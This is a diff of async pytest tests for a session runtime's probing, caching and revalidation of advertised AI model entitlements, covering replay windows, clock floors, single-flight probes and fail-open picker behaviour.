+    assert await rt.probe_advertised_models() == []
+    news = [c for c in rt._send_and_await.call_args_list if c.args[0] == METHOD_SESSION_NEW]
+    assert len(news) == 1
+    # force=True within the same window opens a FRESH session (user action),
+    # which here succeeds.
+    forced = await rt.probe_advertised_models(force=True)
+    assert [m["modelId"] for m in forced] == ["auto", "claude-opus-5"]
+    news = [c for c in rt._send_and_await.call_args_list if c.args[0] == METHOD_SESSION_NEW]
+    assert len(news) == 2
+    # A recent SUCCESS is replayed even under force — no third session opened.
+    again = await rt.probe_advertised_models(force=True)
+    assert [m["modelId"] for m in again] == ["auto", "claude-opus-5"]
+    news = [c for c in rt._send_and_await.call_args_list if c.args[0] == METHOD_SESSION_NEW]
+    assert len(news) == 2
 
 
 @pytest.mark.asyncio
@@ -12709,6 +13219,201 @@ async def test_refresh_keeps_snapshot_on_empty_probe():
     rt.probe_advertised_models = AsyncMock(return_value=[])  # type: ignore[method-assign]
     assert await handle.refresh_available_models() == []
     assert [m["modelId"] for m in handle.available_models] == ["claude-sonnet-4"]
+
+
+_BROAD_SET = [
+    {"modelId": "auto", "name": "auto", "description": ""},
+    {"modelId": "claude-opus-5", "name": "claude-opus-5", "description": ""},
+]
+
+
+def _seed_cached_result(rt, at: float) -> None:
+    """Park a non-empty result on BOTH clocks at monotonic time ``at``."""
+    rt._entitlement_probe_result = list(_BROAD_SET)
+    rt._entitlement_probe_result_at = at
+    rt._entitlement_probe_attempt_at = at
+
+
+@pytest.mark.asyncio
+async def test_a_cached_result_older_than_the_floor_is_not_replayed():
+    """A replay never answers with a result older than the caller's snapshot.
+    Neither clock predating the floor stands in for a probe: the unforced read
+    opens a fresh session/new instead of replaying, and so does a forced one."""
+    rt, _, _ = _make_runtime()
+    # Seeded in the past: Windows' monotonic clock ticks coarsely, so a cache
+    # stamped "now" can share a tick with the fresh result and defeat the
+    # strict "newer" assertion below.
+    t0 = time.monotonic() - 5.0
+    _seed_cached_result(rt, t0)
+    rt._send_and_await = AsyncMock(side_effect=[_PROBE_RESP, {}, _PROBE_RESP, {}])  # type: ignore[method-assign]
+
+    fresh = await rt.probe_advertised_models(not_before=t0 + 1.0)
+    assert [m["modelId"] for m in fresh] == ["auto", "claude-opus-5"]
+    news = [c for c in rt._send_and_await.call_args_list if c.args[0] == METHOD_SESSION_NEW]
+    assert len(news) == 1
+    # The fresh result is newer than the cached one it superseded.
+    assert rt._entitlement_probe_result_at > t0
+
+    forced = await rt.probe_advertised_models(force=True, not_before=time.monotonic() + 1.0)
+    assert [m["modelId"] for m in forced] == ["auto", "claude-opus-5"]
+    news = [c for c in rt._send_and_await.call_args_list if c.args[0] == METHOD_SESSION_NEW]
+    assert len(news) == 2
+
+
+@pytest.mark.asyncio
+async def test_a_failed_attempt_older_than_the_floor_does_not_suppress_the_probe():
+    """A no-evidence attempt that predates the caller's snapshot is not evidence
+    about that snapshot: the read probes. An attempt at or after the floor still
+    replays [] within the window and opens no session/new."""
+    rt, _, _ = _make_runtime()
+    t0 = time.monotonic()
+    rt._entitlement_probe_result = []
+    rt._entitlement_probe_result_at = 0.0
+    rt._entitlement_probe_attempt_at = t0
+    rt._send_and_await = AsyncMock(side_effect=AssertionError("no probe"))  # type: ignore[method-assign]
+
+    assert await rt.probe_advertised_models(not_before=t0) == []
+    assert await rt.probe_advertised_models(not_before=t0 - 5.0) == []
+    assert rt._send_and_await.await_count == 0
+
+    rt._send_and_await = AsyncMock(side_effect=[_PROBE_RESP, {}])  # type: ignore[method-assign]
+    fresh = await rt.probe_advertised_models(not_before=t0 + 1.0)
+    assert [m["modelId"] for m in fresh] == ["auto", "claude-opus-5"]
+    news = [c for c in rt._send_and_await.call_args_list if c.args[0] == METHOD_SESSION_NEW]
+    assert len(news) == 1
+
+
+@pytest.mark.asyncio
+async def test_a_probe_is_stamped_when_its_answer_arrives_not_after_teardown(monkeypatch):
+    """The result clock records the moment the probe's session/new answered,
+    BEFORE the terminate round-trip. A real session/new that completes during
+    that teardown holds a NEWER snapshot, and the floor must keep the probe's
+    older answer from replaying over it."""
+    rt, _, _ = _make_runtime()
+    stamped_during_teardown: list[float] = []
+
+    async def slow_terminate(session_id: str) -> None:
+        await asyncio.sleep(0.05)
+        # A concurrent real session captures its snapshot mid-teardown.
+        stamped_during_teardown.append(time.monotonic())
+
+    monkeypatch.setattr(rt, "terminate_session", slow_terminate)
+    rt._send_and_await = AsyncMock(side_effect=[_PROBE_RESP])  # type: ignore[method-assign]
+
+    fresh = await rt.probe_advertised_models()
+    assert [m["modelId"] for m in fresh] == ["auto", "claude-opus-5"]
+    assert stamped_during_teardown, "teardown fake did not run"
+    # The probe's answer predates the snapshot captured during its teardown...
+    assert rt._entitlement_probe_result_at < stamped_during_teardown[0]
+    # ...so a caller holding that newer snapshot is not served the older answer:
+    # the floor falls through to a real probe attempt (here failing -> []).
+    rt._send_and_await = AsyncMock(side_effect=RuntimeError("probe attempted"))  # type: ignore[method-assign]
+    monkeypatch.setattr(rt, "terminate_session", AsyncMock())
+    rt._entitlement_probe_attempt_at = 0.0
+    assert await rt.probe_advertised_models(not_before=stamped_during_teardown[0]) == []
+    assert rt._send_and_await.await_count == 1
+    rt, _, _ = _make_runtime()
+    t0 = time.monotonic()
+    _seed_cached_result(rt, t0)
+    rt._send_and_await = AsyncMock(side_effect=AssertionError("no probe"))  # type: ignore[method-assign]
+
+    assert await rt.probe_advertised_models(not_before=t0) == _BROAD_SET
+    assert await rt.probe_advertised_models(not_before=t0 - 5.0) == _BROAD_SET
+    assert rt._send_and_await.await_count == 0
+
+
+@pytest.mark.asyncio
+async def test_refresh_never_replaces_a_newer_narrower_snapshot_with_an_older_cache():
+    """A broad answer cached on the shared runtime BEFORE this session captured
+    a narrower list at session/new is not replayed over it, and neither does the
+    stale attempt clock stand in for a probe: the handle earns a fresh
+    session/new, and only that fresh evidence replaces the snapshot."""
+    rt, _, _ = _make_runtime()
+    t0 = time.monotonic() - 5.0
+    _seed_cached_result(rt, t0)
+    rt._send_and_await = AsyncMock(side_effect=[_PROBE_RESP, {}])  # type: ignore[method-assign]
+    q = _register(rt, "sA")
+    handle = AcpSessionHandle("sA", q["sA"], rt)
+    handle.store_session_config({"models": {"availableModels": [{"modelId": "auto"}]}})
+    captured_at = handle._available_models_captured_at
+    assert captured_at > t0
+
+    fresh = await handle.refresh_available_models()
+    news = [c for c in rt._send_and_await.call_args_list if c.args[0] == METHOD_SESSION_NEW]
+    assert len(news) == 1
+    assert [m["modelId"] for m in fresh] == ["auto", "claude-opus-5"]
+    # The snapshot was replaced by the fresh probe, never by the stale cache
+    # (stamped 5s in the past, so this holds on a coarse monotonic clock too).
+    assert rt._entitlement_probe_result_at > t0
+    assert handle._available_models_probe_confirmed is True
+
+
+@pytest.mark.asyncio
+async def test_refresh_replays_a_cache_newer_than_the_snapshot():
+    rt, _, _ = _make_runtime()
+    t0 = time.monotonic()
+    _seed_cached_result(rt, t0)
+    rt._send_and_await = AsyncMock(side_effect=AssertionError("no probe"))  # type: ignore[method-assign]
+    q = _register(rt, "sA")
+    handle = AcpSessionHandle("sA", q["sA"], rt)
+    handle.store_session_config({"models": {"availableModels": [{"modelId": "auto"}]}})
+    handle._available_models_captured_at = t0 - 1.0
+
+    assert await handle.refresh_available_models() == _BROAD_SET
+    assert [m["modelId"] for m in handle.available_models] == ["auto", "claude-opus-5"]
+    assert handle._available_models_probe_confirmed is True
+
+
+@pytest.mark.asyncio
+async def test_the_handle_that_filled_the_cache_gets_the_replay_on_a_repeat_pick(monkeypatch):
+    """The refreshed snapshot is dated from before the probe was awaited, so the
+    answer that filled the cache is at or above this handle's floor: a second
+    forced pick within the TTL replays it rather than opening another
+    throwaway session/new."""
+    rt, _, _ = _make_runtime()
+    q = _register(rt, "sA")
+    handle = AcpSessionHandle("sA", q["sA"], rt)
+    handle.store_session_config({"models": {"availableModels": [{"modelId": "auto"}]}})
+
+    async def slow_terminate(session_id: str) -> None:
+        await asyncio.sleep(0.02)
+
+    monkeypatch.setattr(rt, "terminate_session", slow_terminate)
+    rt._send_and_await = AsyncMock(side_effect=[_PROBE_RESP])  # type: ignore[method-assign]
+
+    first = await handle.refresh_available_models(force=True)
+    assert [m["modelId"] for m in first] == ["auto", "claude-opus-5"]
+    assert handle._available_models_captured_at == rt._entitlement_probe_result_at
+
+    rt._send_and_await = AsyncMock(side_effect=AssertionError("second session/new"))  # type: ignore[method-assign]
+    second = await handle.refresh_available_models(force=True)
+    assert [m["modelId"] for m in second] == ["auto", "claude-opus-5"]
+    assert rt._send_and_await.await_count == 0
+
+
+@pytest.mark.asyncio
+async def test_a_replayed_answer_dates_the_snapshot_by_its_own_clock():
+    """A refresh served from the runtime's replay stores the snapshot dated by
+    the replayed answer's arrival, not by the call: the handle's floor stays at
+    the data it holds, so a further refresh within the TTL replays again (no
+    session/new), and a replay does not re-date the snapshot out of the spawn
+    race window it was captured in."""
+    rt, _, _ = _make_runtime()
+    t0 = time.monotonic() - 5.0
+    _seed_cached_result(rt, t0)
+    rt._send_and_await = AsyncMock(side_effect=AssertionError("no probe"))  # type: ignore[method-assign]
+    q = _register(rt, "sA")
+    handle = AcpSessionHandle("sA", q["sA"], rt)
+    handle.store_session_config({"models": {"availableModels": [{"modelId": "auto"}]}})
+    handle._available_models_captured_at = t0 - 1.0
+
+    assert await handle.refresh_available_models() == _BROAD_SET
+    assert handle._available_models_captured_at == t0
+    assert handle._available_models_captured_at < time.monotonic() - 4.0
+
+    assert await handle.refresh_available_models(force=True) == _BROAD_SET
+    assert handle._available_models_captured_at == t0
+    assert rt._send_and_await.await_count == 0
 
 
 class TestParseAdvertisedModels:
@@ -12885,3 +13590,434 @@ async def test_managed_readiness_keeps_external_wire_roster(kas_readiness_wire, 
                 start.cancel()
             await asyncio.gather(start, return_exceptions=True)
         await _stop_reader(reader_task)
+
+
+# ── Read-path entitlement revalidation (maybe_refresh_available_models) ──
+#
+# The dashboard picker narrows the model catalog through the newest live
+# session's advertised-model snapshot. When that snapshot is the startup-race
+# default it hides models the account has, and no explicit pick is ever refused
+# to trigger the refresh-before-refuse heal. maybe_refresh_available_models is
+# the read-path counterpart: it decides WHETHER a narrowing snapshot is stale
+# enough to re-probe, reusing refresh_available_models for the probe itself. It
+# never decides entitlement (that stays with catalog_row_would_drop, the
+# endpoint's own per-row verdict); these pin the staleness heuristic and the
+# fail-open contract.
+
+_KIRO_CATALOG_IDS = ["auto", "claude-opus-5", "claude-sonnet-5"]
+
+
+def _entitlement_handle(rt):
+    return AcpSessionHandle("sE", _register(rt, "sE")["sE"], rt)
+
+
+@pytest.mark.asyncio
+async def test_auto_only_snapshot_revalidates_and_replaces_from_probe():
+    """(a) The strongest staleness signal — an unconfirmed auto-only snapshot
+    against a richer catalog — re-probes, and a disagreeing probe replaces it."""
+    rt, _, _ = _make_runtime()
+    rt._spawn_monotonic = time.monotonic() - 3600.0  # long past the spawn race band
+    handle = _entitlement_handle(rt)
+    handle._available_models = [{"modelId": "auto", "name": "auto", "description": ""}]
+    handle._mark_available_models_captured()  # unconfirmed
+    full = [
+        {"modelId": "auto", "name": "auto", "description": ""},
+        {"modelId": "claude-sonnet-5", "name": "Sonnet 5", "description": ""},
+        {"modelId": "claude-opus-5", "name": "Opus 5", "description": ""},
+    ]
+    rt.probe_advertised_models = AsyncMock(return_value=full)  # type: ignore[method-assign]
+
+    result = await handle.maybe_refresh_available_models(_KIRO_CATALOG_IDS)
+
+    rt.probe_advertised_models.assert_awaited_once()
+    assert [m["modelId"] for m in result] == [m["modelId"] for m in full]
+    assert [m["modelId"] for m in handle.available_models] == [m["modelId"] for m in full]
+    assert handle._available_models_probe_confirmed is True
+
+
+@pytest.mark.asyncio
+async def test_confirmed_recently_probed_snapshot_does_not_reprobe():
+    """(b) A narrowing snapshot that was probe-confirmed AND probed within the
+    per-session interval is trusted: no probe, snapshot untouched."""
+    rt, _, _ = _make_runtime()
+    rt._spawn_monotonic = time.monotonic() - 3600.0
+    handle = _entitlement_handle(rt)
+    handle._available_models = [
+        {"modelId": "auto", "name": "auto", "description": ""},
+        {"modelId": "claude-sonnet-5", "name": "Sonnet 5", "description": ""},
+    ]
+    handle._mark_available_models_captured()
+    handle._available_models_probe_confirmed = True
+    handle._available_models_read_probe_at = time.monotonic()  # just probed
+    rt.probe_advertised_models = AsyncMock(return_value=[])  # type: ignore[method-assign]
+
+    result = await handle.maybe_refresh_available_models(_KIRO_CATALOG_IDS)
+
+    rt.probe_advertised_models.assert_not_awaited()
+    assert [m["modelId"] for m in result] == ["auto", "claude-sonnet-5"]
+
+
+@pytest.mark.asyncio
+async def test_probe_failure_keeps_the_current_snapshot_fail_open():
+    """(c) A probe that fails must never worsen the picker: the current snapshot
+    is returned unchanged, exactly as before the read-path revalidation."""
+    rt, _, _ = _make_runtime()
+    rt._spawn_monotonic = time.monotonic()  # inside the spawn race band -> suspect
+    handle = _entitlement_handle(rt)
+    handle._available_models = [
+        {"modelId": "auto", "name": "auto", "description": ""},
+        {"modelId": "claude-sonnet-5", "name": "Sonnet 5", "description": ""},
+    ]
+    handle._mark_available_models_captured()
+    rt.probe_advertised_models = AsyncMock(  # type: ignore[method-assign]
+        side_effect=RuntimeError("boom")
+    )
+
+    result = await handle.maybe_refresh_available_models(_KIRO_CATALOG_IDS)
+
+    rt.probe_advertised_models.assert_awaited_once()
+    assert [m["modelId"] for m in result] == ["auto", "claude-sonnet-5"]
+    assert [m["modelId"] for m in handle.available_models] == ["auto", "claude-sonnet-5"]
+
+
+@pytest.mark.asyncio
+async def test_unconfirmed_narrow_snapshot_reprobes_and_probe_agrees():
+    """(d) A legitimately narrow but never-probe-confirmed snapshot IS suspect,
+    so it re-probes; a probe that agrees marks it confirmed and it stays narrow."""
+    rt, _, _ = _make_runtime()
+    rt._spawn_monotonic = time.monotonic() - 3600.0
+    handle = _entitlement_handle(rt)
+    narrow = [
+        {"modelId": "auto", "name": "auto", "description": ""},
+        {"modelId": "claude-sonnet-5", "name": "Sonnet 5", "description": ""},
+    ]
+    handle._available_models = list(narrow)
+    handle._mark_available_models_captured()  # confirmed=False
+    assert handle._available_models_probe_confirmed is False
+    rt.probe_advertised_models = AsyncMock(return_value=narrow)  # type: ignore[method-assign]
+
+    result = await handle.maybe_refresh_available_models(_KIRO_CATALOG_IDS)
+
+    rt.probe_advertised_models.assert_awaited_once()
+    assert [m["modelId"] for m in result] == ["auto", "claude-sonnet-5"]
+    assert handle._available_models_probe_confirmed is True
+
+
+@pytest.mark.asyncio
+async def test_snapshot_covering_the_catalog_never_probes():
+    """The cheap-path gate: a snapshot that would not narrow the catalog cannot
+    hide anything, so no probe is spent even when it was never confirmed."""
+    rt, _, _ = _make_runtime()
+    rt._spawn_monotonic = time.monotonic()  # would be "suspect" if it narrowed
+    handle = _entitlement_handle(rt)
+    handle._available_models = [
+        {"modelId": mid, "name": mid, "description": ""} for mid in _KIRO_CATALOG_IDS
+    ]
+    handle._mark_available_models_captured()  # confirmed=False
+    rt.probe_advertised_models = AsyncMock(return_value=[])  # type: ignore[method-assign]
+
+    result = await handle.maybe_refresh_available_models(_KIRO_CATALOG_IDS)
+
+    rt.probe_advertised_models.assert_not_awaited()
+    assert [m["modelId"] for m in result] == _KIRO_CATALOG_IDS
+
+
+@pytest.mark.asyncio
+async def test_unadvertised_auto_sentinel_alone_does_not_trigger_a_probe():
+    """The endpoint keeps ``auto`` whatever the snapshot advertises, so a
+    snapshot that omits only ``auto`` narrows nothing and spends no probe."""
+    rt, _, _ = _make_runtime()
+    rt._spawn_monotonic = time.monotonic()  # would be "suspect" if it narrowed
+    handle = _entitlement_handle(rt)
+    handle._available_models = [{"modelId": "m1", "name": "m1", "description": ""}]
+    handle._mark_available_models_captured()  # confirmed=False
+    rt.probe_advertised_models = AsyncMock(return_value=[])  # type: ignore[method-assign]
+
+    result = await handle.maybe_refresh_available_models(["auto", "m1"])
+
+    rt.probe_advertised_models.assert_not_awaited()
+    assert handle._read_refresh_task is None
+    assert [m["modelId"] for m in result] == ["m1"]
+
+
+@pytest.mark.asyncio
+async def test_unadvertised_real_model_beside_auto_still_probes():
+    """Excluding the ``auto`` sentinel is narrow: a real catalog model the
+    snapshot omits still makes the snapshot narrowing, so it probes."""
+    rt, _, _ = _make_runtime()
+    rt._spawn_monotonic = time.monotonic()
+    handle = _entitlement_handle(rt)
+    snapshot = [{"modelId": "m1", "name": "m1", "description": ""}]
+    handle._available_models = list(snapshot)
+    handle._mark_available_models_captured()  # confirmed=False
+    rt.probe_advertised_models = AsyncMock(return_value=snapshot)  # type: ignore[method-assign]
+
+    result = await handle.maybe_refresh_available_models(["auto", "m1", "m2"])
+
+    rt.probe_advertised_models.assert_awaited_once()
+    assert [m["modelId"] for m in result] == ["m1"]
+
+
+@pytest.mark.asyncio
+async def test_namespace_qualified_row_the_endpoint_folds_does_not_probe():
+    """A ``ns::id`` catalog row whose bare id the snapshot advertises is KEPT by
+    the endpoint (rewritten to the bare id), so it hides nothing and spends no
+    probe."""
+    rt, _, _ = _make_runtime()
+    rt._spawn_monotonic = time.monotonic()  # would be "suspect" if it narrowed
+    handle = _entitlement_handle(rt)
+    handle._available_models = [
+        {"modelId": "auto", "name": "auto", "description": ""},
+        {"modelId": "m1", "name": "m1", "description": ""},
+    ]
+    handle._mark_available_models_captured()  # confirmed=False
+    rt.probe_advertised_models = AsyncMock(return_value=[])  # type: ignore[method-assign]
+
+    result = await handle.maybe_refresh_available_models(["auto", "ns::m1"])
+
+    rt.probe_advertised_models.assert_not_awaited()
+    assert handle._read_refresh_task is None
+    assert [m["modelId"] for m in result] == ["auto", "m1"]
+
+
+@pytest.mark.asyncio
+async def test_empty_catalog_id_does_not_trigger_a_probe():
+    """An empty catalog id drops against every snapshot, so a fresher one cannot
+    restore it and it spends no probe."""
+    rt, _, _ = _make_runtime()
+    rt._spawn_monotonic = time.monotonic()  # would be "suspect" if it narrowed
+    handle = _entitlement_handle(rt)
+    handle._available_models = [{"modelId": "m1", "name": "m1", "description": ""}]
+    handle._mark_available_models_captured()  # confirmed=False
+    rt.probe_advertised_models = AsyncMock(return_value=[])  # type: ignore[method-assign]
+
+    result = await handle.maybe_refresh_available_models(["", "m1"])
+
+    rt.probe_advertised_models.assert_not_awaited()
+    assert handle._read_refresh_task is None
+    assert [m["modelId"] for m in result] == ["m1"]
+
+
+@pytest.mark.asyncio
+async def test_disjoint_snapshot_the_endpoint_fails_open_on_does_not_probe():
+    """A snapshot that advertises neither ``auto`` nor any catalog row makes the
+    endpoint fail open to the full catalog, so it narrows nothing and spends no
+    probe."""
+    rt, _, _ = _make_runtime()
+    rt._spawn_monotonic = time.monotonic()  # would be "suspect" if it narrowed
+    handle = _entitlement_handle(rt)
+    handle._available_models = [{"modelId": "x9", "name": "x9", "description": ""}]
+    handle._mark_available_models_captured()  # confirmed=False
+    rt.probe_advertised_models = AsyncMock(return_value=[])  # type: ignore[method-assign]
+
+    result = await handle.maybe_refresh_available_models(["auto", "m1", "m2"])
+
+    rt.probe_advertised_models.assert_not_awaited()
+    assert handle._read_refresh_task is None
+    assert [m["modelId"] for m in result] == ["x9"]
+
+
+@pytest.mark.asyncio
+async def test_probe_deadline_timeout_raises_revalidating_but_probe_completes():
+    """O1/F2: when the probe exceeds the read deadline the read RAISES
+    EntitlementRevalidating (so the endpoint returns 503 and the frontend
+    re-polls rather than caching the un-revalidated snapshot as live), and the
+    probe is NOT cancelled — it keeps running to completion and replaces the
+    snapshot, so the next read serves the corrected list."""
+    from kiro_crew.acp.session_handle import EntitlementRevalidating
+
+    rt, _, _ = _make_runtime()
+    rt._spawn_monotonic = time.monotonic() - 3600.0
+    handle = _entitlement_handle(rt)
+    handle._available_models = [{"modelId": "auto", "name": "auto", "description": ""}]
+    handle._mark_available_models_captured()
+
+    release = asyncio.Event()
+    probe_finished = asyncio.Event()
+
+    async def _slow(*_a, **_kw) -> list:
+        await release.wait()
+        probe_finished.set()
+        return [
+            {"modelId": "auto", "name": "auto", "description": ""},
+            {"modelId": "claude-opus-5", "name": "Opus 5", "description": ""},
+        ]
+
+    rt.probe_advertised_models = AsyncMock(side_effect=_slow)  # type: ignore[method-assign]
+    from kiro_crew.acp import session_handle as _sh
+
+    with patch.object(_sh, "_READ_PATH_PROBE_DEADLINE_SECS", 0.01):
+        with pytest.raises(EntitlementRevalidating):
+            await handle.maybe_refresh_available_models(_KIRO_CATALOG_IDS)
+
+    # Timed out -> signalled revalidating, probe still in flight (not cancelled).
+    assert handle._read_refresh_task is not None and not handle._read_refresh_task.done()
+
+    # Let the probe finish; it was NOT cancelled, so it completes and replaces
+    # the snapshot in place (what the next read will serve).
+    release.set()
+    await asyncio.wait_for(probe_finished.wait(), 2.0)
+    await asyncio.wait_for(handle._read_refresh_task, 2.0)
+    assert [m["modelId"] for m in handle.available_models] == ["auto", "claude-opus-5"]
+    assert handle._available_models_probe_confirmed is True
+
+
+@pytest.mark.asyncio
+async def test_in_flight_probe_is_awaited_not_bypassed_on_the_next_poll():
+    """P1: the frontend re-polls every 8s while degraded. A second read that
+    lands WHILE the same shielded probe is still in flight must NOT bypass it via
+    the interval gate and return the un-revalidated snapshot (which the endpoint
+    would serve as a live 200 the frontend caches). It re-awaits the same task,
+    so it raises EntitlementRevalidating again; only once the probe lands does a
+    read return the corrected list."""
+    from kiro_crew.acp.session_handle import EntitlementRevalidating
+
+    rt, _, _ = _make_runtime()
+    rt._spawn_monotonic = time.monotonic() - 3600.0
+    handle = _entitlement_handle(rt)
+    handle._available_models = [{"modelId": "auto", "name": "auto", "description": ""}]
+    handle._mark_available_models_captured()
+
+    release = asyncio.Event()
+
+    async def _slow(*_a, **_kw) -> list:
+        await release.wait()
+        return [
+            {"modelId": "auto", "name": "auto", "description": ""},
+            {"modelId": "claude-opus-5", "name": "Opus 5", "description": ""},
+        ]
+
+    rt.probe_advertised_models = AsyncMock(side_effect=_slow)  # type: ignore[method-assign]
+    from kiro_crew.acp import session_handle as _sh
+
+    with patch.object(_sh, "_READ_PATH_PROBE_DEADLINE_SECS", 0.01):
+        # First read: starts the probe, times out, raises.
+        with pytest.raises(EntitlementRevalidating):
+            await handle.maybe_refresh_available_models(_KIRO_CATALOG_IDS)
+        # Second read INSIDE the interval while the same probe still runs: it
+        # must re-await that task and raise again, NOT return the stale snapshot.
+        with pytest.raises(EntitlementRevalidating):
+            await handle.maybe_refresh_available_models(_KIRO_CATALOG_IDS)
+
+    # Exactly one probe was ever started (the second read reused the task).
+    assert rt.probe_advertised_models.await_count == 1
+
+    # Let the probe land; a read now returns the corrected list.
+    release.set()
+    await asyncio.wait_for(handle._read_refresh_task, 2.0)
+    third = await handle.maybe_refresh_available_models(_KIRO_CATALOG_IDS)
+    assert [m["modelId"] for m in third] == ["auto", "claude-opus-5"]
+    assert rt.probe_advertised_models.await_count == 1
+
+
+@pytest.mark.asyncio
+async def test_confirmed_auto_only_snapshot_honours_the_reprobe_interval():
+    """F3: a genuine free-tier account is legitimately auto-only. Once a probe
+    has CONFIRMED an auto-only snapshot, an immediate second read must NOT probe
+    again — auto-only overrides the confirmed flag, not the re-probe interval."""
+    rt, _, _ = _make_runtime()
+    rt._spawn_monotonic = time.monotonic() - 3600.0
+    handle = _entitlement_handle(rt)
+    handle._available_models = [{"modelId": "auto", "name": "auto", "description": ""}]
+    handle._mark_available_models_captured()  # unconfirmed
+    # The probe agrees: the account really is auto-only.
+    rt.probe_advertised_models = AsyncMock(  # type: ignore[method-assign]
+        return_value=[{"modelId": "auto", "name": "auto", "description": ""}]
+    )
+
+    first = await handle.maybe_refresh_available_models(_KIRO_CATALOG_IDS)
+    assert [m["modelId"] for m in first] == ["auto"]
+    assert rt.probe_advertised_models.await_count == 1
+    assert handle._available_models_probe_confirmed is True
+
+    # Immediate second read: still auto-only and still narrowing, but confirmed
+    # and inside the interval -> no second probe (no forever re-probe).
+    second = await handle.maybe_refresh_available_models(_KIRO_CATALOG_IDS)
+    assert [m["modelId"] for m in second] == ["auto"]
+    assert rt.probe_advertised_models.await_count == 1
+
+
+@pytest.mark.asyncio
+async def test_unconfirmed_auto_only_always_earns_one_probe_even_if_recent():
+    """F3 boundary: auto-only still overrides the CONFIRMED flag. An unconfirmed
+    auto-only snapshot probes even when the read-probe clock was recently set,
+    because it has never been confirmed."""
+    rt, _, _ = _make_runtime()
+    rt._spawn_monotonic = time.monotonic() - 3600.0
+    handle = _entitlement_handle(rt)
+    handle._available_models = [{"modelId": "auto", "name": "auto", "description": ""}]
+    handle._mark_available_models_captured()  # unconfirmed
+    # A recent read-probe stamp would gate a confirmed snapshot; unconfirmed
+    # auto-only is suspect regardless, and the stamp is only consulted after the
+    # suspect gate — but confirmed is False here so it must still probe.
+    rt.probe_advertised_models = AsyncMock(  # type: ignore[method-assign]
+        return_value=[
+            {"modelId": "auto", "name": "auto", "description": ""},
+            {"modelId": "claude-opus-5", "name": "Opus 5", "description": ""},
+        ]
+    )
+    result = await handle.maybe_refresh_available_models(_KIRO_CATALOG_IDS)
+    assert rt.probe_advertised_models.await_count == 1
+    assert [m["modelId"] for m in result] == ["auto", "claude-opus-5"]
+
+
+@pytest.mark.asyncio
+async def test_unconfirmed_auto_only_reprobes_after_a_failed_probe_within_the_interval():
+    """G2: a FAILED probe leaves an auto-only snapshot unconfirmed, and the
+    interval must not then suppress it for the whole window — an unconfirmed
+    auto-only snapshot always gets to probe. The first read probes and the probe
+    raises; the immediate second read probes AGAIN rather than sitting stale."""
+    rt, _, _ = _make_runtime()
+    rt._spawn_monotonic = time.monotonic() - 3600.0
+    handle = _entitlement_handle(rt)
+    handle._available_models = [{"modelId": "auto", "name": "auto", "description": ""}]
+    handle._mark_available_models_captured()  # unconfirmed
+    rt.probe_advertised_models = AsyncMock(  # type: ignore[method-assign]
+        side_effect=RuntimeError("boom")
+    )
+
+    first = await handle.maybe_refresh_available_models(_KIRO_CATALOG_IDS)
+    assert [m["modelId"] for m in first] == ["auto"]
+    assert rt.probe_advertised_models.await_count == 1
+    # Probe failed -> still unconfirmed. Immediately (inside the interval) probe
+    # again rather than suppressing an unconfirmed auto-only snapshot.
+    assert handle._available_models_probe_confirmed is False
+    # Drain the failed task (it raised) so single-flight starts a fresh probe.
+    with pytest.raises(RuntimeError):
+        await asyncio.wait_for(handle._read_refresh_task, 2.0)
+    second = await handle.maybe_refresh_available_models(_KIRO_CATALOG_IDS)
+    assert [m["modelId"] for m in second] == ["auto"]
+    assert rt.probe_advertised_models.await_count == 2
+
+
+@pytest.mark.asyncio
+async def test_read_path_revalidation_reuses_the_shared_probe_not_a_second_one():
+    """Mutation probe / no-second-spelling guard: the read path heals through
+    refresh_available_models (which calls the runtime's single-flight probe),
+    NOT a private re-implementation. If maybe_refresh_available_models stopped
+    delegating to refresh_available_models, the snapshot would never be replaced
+    and this disagreeing probe would be ignored — the exact regression this pins.
+    """
+    rt, _, _ = _make_runtime()
+    rt._spawn_monotonic = time.monotonic() - 3600.0
+    handle = _entitlement_handle(rt)
+    handle._available_models = [{"modelId": "auto", "name": "auto", "description": ""}]
+    handle._mark_available_models_captured()
+    full = [
+        {"modelId": "auto", "name": "auto", "description": ""},
+        {"modelId": "claude-opus-5", "name": "Opus 5", "description": ""},
+    ]
+    calls = {"n": 0}
+
+    async def _probe(*_a, **_kw) -> list:
+        calls["n"] += 1
+        return full
+
+    rt.probe_advertised_models = AsyncMock(side_effect=_probe)  # type: ignore[method-assign]
+
+    await handle.maybe_refresh_available_models(_KIRO_CATALOG_IDS)
+
+    # Exactly one shared probe, and the snapshot was replaced through the shared
+    # refresh path — proof the read path did not grow a second parser/probe.
+    assert calls["n"] == 1
+    assert [m["modelId"] for m in handle.available_models] == ["auto", "claude-opus-5"]
